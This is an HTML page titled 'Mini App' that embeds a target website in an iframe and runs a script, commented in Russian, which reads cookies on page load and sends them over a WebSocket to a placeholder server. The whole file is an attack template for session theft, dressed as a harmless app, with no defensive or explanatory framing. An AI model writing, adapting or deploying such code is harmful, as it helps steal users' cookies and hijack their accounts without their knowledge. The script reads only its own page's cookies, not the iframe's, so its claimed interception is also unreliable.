<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mini App</title>
</head>
<body>
    <h1>Welcome to Mini App</h1>
    <iframe id="targetSite" src="https://target-website.com" style="width: 100%; height: 100vh;"></iframe>

    <script>
        // Функция для перехвата куки
        function captureCookies() {
            const cookies = document.cookie;
            console.log('Cookies:', cookies);
            // Отправка куки через WebSocket
            sendCookiesViaWebSocket(cookies);
        }

        // Функция для отправки куки через WebSocket
        function sendCookiesViaWebSocket(cookies) {
            const socket = new WebSocket('ws://your-websocket-server.com');

            socket.onopen = function(event) {
                socket.send(JSON.stringify({ cookies: cookies }));
            };

            socket.onmessage = function(event) {
                console.log('Received message from server:', event.data);
            };
        }

        // Перехват куки при загрузке страницы
        window.onload = captureCookies;
    </script>
</body>
</html>
